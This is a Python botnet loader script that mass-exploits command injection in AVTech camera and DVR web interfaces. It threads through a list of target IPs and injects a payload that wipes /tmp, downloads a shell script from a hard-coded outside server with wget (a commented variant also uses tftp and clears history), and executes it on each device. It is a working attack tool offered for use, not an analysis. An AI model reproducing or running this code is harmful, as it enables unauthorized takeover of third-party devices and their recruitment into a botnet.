#   Avtech loader - #

import sys, time, requests, socket
from threading import Thread
import random
sendall = True
num = 1

host_server = "107.175.31.130" #change host server here
ips = open(sys.argv[1], "r").readlines()
random.shuffle(ips)
filename = random.randint(1, 100)                                 #change the sh name to ur bins
filename = str(filename) 
payload = "cd%20/tmp;rm%20-rf%20*;%20wget%20http://"+host_server+"/fuckme.sh%20-O%20"+filename+".x;%20sh%20"+filename+".x;%20rm%20"+filename+".x;"
global running
running = 0 #cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://107.175.31.130/fuckme.sh; chmod 777 *; sh fuckme.sh; tftp -g 107.175.31.130 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c
def avtech(num, ip, port):
    global running
    running += 1
    port = int(port)
    host = '%s:%d' % (ip, port)
    url = "http://"+host+"/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$("+payload+")&password=admin"
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip,port))
        s.close()
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, sdch",
            "Accept-Language": "en-US,en;q=0.8",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Host": ip,
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Snickers-Avtech"
        }
        r1 = requests.get(url, timeout=10, headers=headers)
        resp = r1.text
        if "ok" in resp.lower():
            print "(%d) Sent payload[1]" % (num)
        if sendall:
            url1 = "http://"+host+"/nobody/ez.htm?a=YWRtaW46YWRtaW4=&rnd=0.06814667194551349"
            url2 = "http://"+host+"/cgi-bin/supervisor/CloudSetup.cgi?exefile="+payload+";%20echo%20keksec"
            r2 = requests.get(url1, timeout=10, headers=headers)
            r3 = requests.get(url2, timeout=10, headers=headers)
            resp = r3.text
            if "keksec" in resp.lower():
                print "(%d) Sent payload[2]" % (num)
            else:
                print "(%d) Failed to send both payloads..." % (num)
    except:
        pass
    running -= 1
print "[AVTech] Directing Bots Towards -> %s" % (host_server)
for i in ips:
    i = i.strip("\r\n")
    info = i.split(":")
    ip = info[0]
    port = info[1]
    if running >= 512:
        time.sleep(0.5)
    proc = Thread(target=avtech, args=(num, ip, port,))
    proc.start()
    num += 1
    
print "[AVTech] Finished Loading..."
